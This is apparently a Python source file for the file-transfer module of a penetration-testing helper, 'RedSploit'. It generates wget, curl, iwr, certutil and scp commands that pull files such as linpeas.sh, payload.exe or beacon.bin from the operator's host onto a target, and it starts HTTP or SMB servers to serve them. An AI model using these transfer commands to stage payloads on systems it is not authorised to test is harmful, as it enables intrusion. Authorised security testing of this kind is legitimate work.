import os
import shlex
import subprocess
import socket
import glob
from ..core.colors import log_info, log_success, log_error, log_warn, Colors
from ..core.base_shell import BaseShell
from .base import BaseModule
from ..core.utils import get_ip_address

class FileModule(BaseModule):
    MODULE_NAME = "file"
    TOOLS = {
        "wget": "wget http://{ip}:{port}/{filename}",
        "wget_write": "wget http://{ip}:{port}/{filename} -O {filename}",
        "curl": "curl http://{ip}:{port}/{filename} -O",
        "curl_write": "curl http://{ip}:{port}/{filename} -o {filename}",
        "iwr": "iwr http://{ip}:{port}/{filename} -OutFile {filename}",
        "certutil": "certutil -urlcache -split -f http://{ip}:{port}/{filename} {filename}",
        "scp": "scp user@{ip}:$(pwd)/{filename} .",
        "base64": "base64 {filename}"
    }
    COMMANDS = {
        "download": {
            "desc": "Generate a file download command for the current interface and port",
            "category": "File Transfer",
            "usage": "download <filename> [tool]",
            "session_inputs": ["interface", "fileport"],
            "examples": [
                "download linpeas.sh",
                "download payload.exe curl",
                "red -f -download payload.exe certutil -p",
            ],
            "details": [
                "Transfer tools: wget, curl, iwr, certutil, scp",
                "If the HTTP server is not running, RedSploit autostarts it on fileport.",
            ],
            "flags": [
                "-c         Copy command to clipboard without running",
                "-p         Preview command without running",
                "-e         Edit command before printing/copying",
            ],
        },
        "base64": {
            "desc": "Encode a local file to base64 for manual transfer",
            "category": "Encoding",
            "usage": "base64 <filename>",
            "session_inputs": [],
            "examples": [
                "base64 exploit.sh",
                "red -f -base64 beacon.bin",
            ],
            "flags": [
                "-c         Copy command to clipboard without running",
                "-p         Preview command without running",
                "-e         Edit command before printing/copying",
            ],
        },
        "server": {
            "desc": "Start an HTTP or SMB file server from the current directory",
            "category": "Servers",
            "usage": "server [http|smb]",
            "session_inputs": ["interface", "fileport"],
            "examples": [
                "server",
                "server smb",
                "red -f -http",
                "red -f -smb",
            ],
            "details": [
                "HTTP uses python3 -m http.server on the current fileport.",
                "SMB uses impacket-smbserver and serves the current directory as 'share'.",
            ],
            "flags": [
                "-p         Preview the server command without starting it",
            ],
            "aliases": ["http", "smb"],
        },
    }

    def __init__(self, session):
        super().__init__(session)

    @classmethod
    def resolve_command_name(cls, raw_name):
        normalized = raw_name.lstrip("-").replace("-", "_")
        if normalized in cls.COMMANDS:
            return normalized
        for command_name, command in cls.COMMANDS.items():
            if normalized in command.get("aliases", []):
                return command_name
        return None

    @classmethod
    def find_command_invocation(cls, args_list):
        for idx, arg in enumerate(args_list):
            if not arg.startswith("-"):
                continue
            resolved_name = cls.resolve_command_name(arg)
            if resolved_name:
                return idx, resolved_name
        return None, None

    def print_command_help(self, command_name):
        command = self.COMMANDS.get(command_name)
        if not command:
            log_error(f"Command '{command_name}' not found.")
            return

        print(f"\n{Colors.HEADER}{command_name}{Colors.ENDC}")
        print(f"  {command['desc']}")

        print(f"\n{Colors.BOLD}Usage:{Colors.ENDC} {command['usage']}")

        session_inputs = command.get("session_inputs", [])
        if session_inputs:
            print(f"{Colors.BOLD}Session inputs:{Colors.ENDC} {', '.join(session_inputs)}")

        aliases = command.get("aliases", [])
        if aliases:
            print(f"{Colors.BOLD}Aliases:{Colors.ENDC} {', '.join(aliases)}")

        details = command.get("details", [])
        if details:
            print(f"\n{Colors.BOLD}Details:{Colors.ENDC}")
            for detail in details:
                print(f"  {detail}")

        print(f"\n{Colors.BOLD}Recommended usage:{Colors.ENDC}")
        for example in command.get("examples", []):
            print(f"  {example}")

        flags = command.get("flags", [])
        if flags:
            print(f"\n{Colors.BOLD}Flags:{Colors.ENDC}")
            for flag in flags:
                print(f"  {flag}")

        print("")

    def is_port_in_use(self, port):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            return s.connect_ex(('localhost', port)) == 0

    def run_download(self, filename, tool="wget", write=False, copy_only=False, edit=False, preview=False):
        if not filename:
            log_error("Filename is required.")
            return

        interface = self.session.get("interface")
        ip_addr = get_ip_address(interface)
        
        if not ip_addr:
            log_error(f"Could not find IP for interface {interface}")
            return

        # Determine Tool Key
        tool_key = tool
        if write and tool in ["wget", "curl"]:
            tool_key += "_write"
        
        cmd_template = self.TOOLS.get(tool_key)
        if not cmd_template:
            log_error(f"Unknown tool: {tool}")
            return

        fileport = self.session.get("fileport") or "8000"
        cmd = cmd_template.format(
            ip=shlex.quote(ip_addr),
            port=fileport,
            filename=shlex.quote(filename)
        )
        
        if copy_only or edit or preview:
            self._exec(cmd, copy_only, edit, run=False, preview=preview)
        else:
            log_success(f"Download Command ({tool}):")
            self._exec(cmd, copy_only=False, edit=False, run=False, preview=preview)
            
            # Auto-start server if not running
            port = int(self.session.get("fileport") or "8000")
            if not self.is_port_in_use(port):
                log_info(f"Autostarting HTTP server on port {port}...")
                self.run_server("http")

    def run_base64(self, filename, copy_only=False, edit=False, preview=False):
        if os.path.isfile(filename):
            log_success(f"Base64 encoded content of {filename}:")
            cmd = self.TOOLS["base64"].format(filename=shlex.quote(filename))
            self._exec(cmd, copy_only, edit, preview=preview)
        else:
            log_error(f"File {filename} not found locally.")

    def run_server(self, server_type="http", preview=False):
        interface = self.session.get("interface")
        ip_addr = get_ip_address(interface)
        
        if not ip_addr:
            log_error(f"Could not find IP for interface {interface}")
            return

        fileport = self.session.get("fileport") or "8000"
        cmd = []
        if server_type == "http":
            cmd = ["python3", "-m", "http.server", fileport]
            msg = f"Starting HTTP server on {interface} ({ip_addr}:{fileport})..."
        elif server_type == "smb":
            cmd = ["sudo", "impacket-smbserver", "share", ".", "-smb2support"]
            msg = f"Starting SMB server on {interface}..."
        
        if preview:
            print(f"{Colors.OKCYAN}{' '.join(cmd)}{Colors.ENDC}")
            return
            
        log_info(msg)
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\nServer stopped.")

    def _run_download_command(self, args_list, command_index, cli_flags):
        command_args = args_list[command_index + 1:]
        if not command_args:
            log_error("Usage: -download <filename>")
            return

        filename = command_args[0]
        tool = command_args[1] if len(command_args) > 1 and not command_args[1].startswith("-") else "wget"
        self.run_download(
            filename,
            tool,
            copy_only=cli_flags["copy_only"],
            edit=cli_flags["edit"],
            preview=cli_flags["preview"],
        )

    def _run_base64_command(self, args_list, command_index, cli_flags):
        command_args = args_list[command_index + 1:]
        if not command_args:
            log_error("Usage: -base64 <filename>")
            return

        self.run_base64(
            command_args[0],
            copy_only=cli_flags["copy_only"],
            edit=cli_flags["edit"],
            preview=cli_flags["preview"],
        )

    def _resolve_server_type(self, command_token, command_args):
        command_name = command_token.lstrip("-").replace("-", "_")
        if command_name in {"http", "smb"}:
            return command_name
        if command_args and command_args[0] in {"http", "smb"}:
            return command_args[0]
        return "http"

    def _run_server_command(self, args_list, command_index, cli_flags):
        command_token = args_list[command_index]
        command_args = args_list[command_index + 1:]
        server_type = self._resolve_server_type(command_token, command_args)
        self.run_server(server_type, preview=cli_flags["preview"])

    def _run_implicit_download(self, args_list, cli_flags):
        non_flag_args = [arg for arg in args_list if not arg.startswith("-")]

        if not non_flag_args:
            log_warn("No valid tool flag found. Use interactive mode.")
            return

        potential_iface = non_flag_args[0]
        if get_ip_address(potential_iface):
            self.session.set("interface", potential_iface)
            non_flag_args.pop(0)

        if not non_flag_args:
            log_warn("Interface set, but no filename provided.")
            return

        filename = non_flag_args[0]
        tool = non_flag_args[1] if len(non_flag_args) > 1 else "wget"
        self.run_download(
            filename,
            tool,
            copy_only=cli_flags["copy_only"],
            edit=cli_flags["edit"],
            preview=cli_flags["preview"],
        )

    def run(self, args_list):
        args_list, cli_flags = self.parse_cli_options(args_list)
        command_index, command_name = self.find_command_invocation(args_list)

        if command_name and self.has_help_flag(args_list[command_index + 1:]):
            self.print_command_help(command_name)
            return

        # Handle help request
        if self.has_help_flag(args_list):
            from ..core.colors import Colors
            print(f"\n{Colors.HEADER}File Transfer Module{Colors.ENDC}")
            print("Usage: red -f <command> [arguments]")
            print("")
            print(f"{Colors.HEADER}Available Commands:{Colors.ENDC}")
            print("")
            print(f"{Colors.BOLD}File Transfer{Colors.ENDC}")
            print("  -download <file> [tool]    Generate download command (wget, curl, iwr, certutil)")
            print("  -base64 <file>             Encode file to base64")
            print("")
            print(f"{Colors.BOLD}Servers{Colors.ENDC}")
            print("  -http                      Start HTTP server (default port: 8000, set with 'set fileport')")
            print("  -smb                       Start SMB server")
            print("")
            print(f"{Colors.HEADER}Examples:{Colors.ENDC}")
            print("  red -f -download linpeas.sh")
            print("  red -f -download payload.exe curl")
            print("  red -f -http")
            print("  red -f -base64 exploit.sh")
            print("  red -f -download -h")
            print("")
            return

        if command_name == "download":
            self._run_download_command(args_list, command_index, cli_flags)
            return

        if command_name == "base64":
            self._run_base64_command(args_list, command_index, cli_flags)
            return

        if command_name == "server":
            self._run_server_command(args_list, command_index, cli_flags)
            return

        self._run_implicit_download(args_list, cli_flags)


class FileShell(BaseShell):
    COMMAND_CATEGORIES = {
        "download": "File Transfer",
        "base64": "Encoding",
        "server": "Servers",
    }

    def __init__(self, session):
        super().__init__(session, "file")
        self.file_module = FileModule(session)

    def do_help(self, arg):
        command_name = self.file_module.resolve_command_name(arg.strip()) if arg else None
        if command_name:
            self.file_module.print_command_help(command_name)
            return
        super().do_help(arg)

    def do_download(self, arg):
        """Generate download command: download <filename> [tool]"""
        if arg.strip() in ("-h", "--help", "help"):
            self.file_module.print_command_help("download")
            return
        arg, copy_only, edit, preview, _, _ = self.parse_common_options(arg)
        parts = arg.split()
        if not parts:
            log_error("Usage: download <filename> [tool]")
            return
        filename = parts[0]
        tool = parts[1] if len(parts) > 1 else "wget"
        # Optional write flag handling could be better in generic parsing, but keeping simple here
        self.file_module.run_download(filename, tool, write=False, copy_only=copy_only, edit=edit, preview=preview)

    def complete_download(self, text, line, begidx, endidx):
        """Autocomplete for download command"""
        args = line.split()
        if len(args) < 2 or (len(args) == 2 and not line.endswith(' ')):
            return [f for f in glob.glob(text + '*') if os.path.isfile(f)]
        elif len(args) < 3 or (len(args) == 3 and not line.endswith(' ')):
            tools = ["wget", "curl", "iwr", "certutil", "scp"]
            return [t for t in tools if t.startswith(text)]
        return []

    def do_base64(self, arg):
        """Base64 encode a file: base64 <filename>"""
        if arg.strip() in ("-h", "--help", "help"):
            self.file_module.print_command_help("base64")
            return
        arg, copy_only, edit, preview, _, _ = self.parse_common_options(arg)
        if not arg:
            log_error("Usage: base64 <filename>")
            return
        self.file_module.run_base64(arg, copy_only, edit, preview)

    def complete_base64(self, text, line, begidx, endidx):
        """Autocomplete for base64 command"""
        return [f for f in glob.glob(text + '*') if os.path.isfile(f)]

    def do_server(self, arg):
        """Start a server: server [http|smb]"""
        if arg.strip() in ("-h", "--help", "help"):
            self.file_module.print_command_help("server")
            return
        arg, copy_only, edit, preview, _, _ = self.parse_common_options(arg)
        if copy_only or edit:
            log_warn("server only supports -p/--preview. -c and -e were ignored.")
        server_type = arg.strip() or "http"
        self.file_module.run_server(server_type, preview=preview)

    def complete_server(self, text, line, begidx, endidx):
        """Autocomplete for server command"""
        types = ["http", "smb"]
        if text:
            return [t for t in types if t.startswith(text)]
        return types

    def complete_use(self, text, line, begidx, endidx):
        """Autocomplete module names for 'use' command, excluding loot and playbook"""
        modules = ["infra", "web", "file", "shell", "main"]
        if text:
            return [m for m in modules if m.startswith(text)]
        return modules
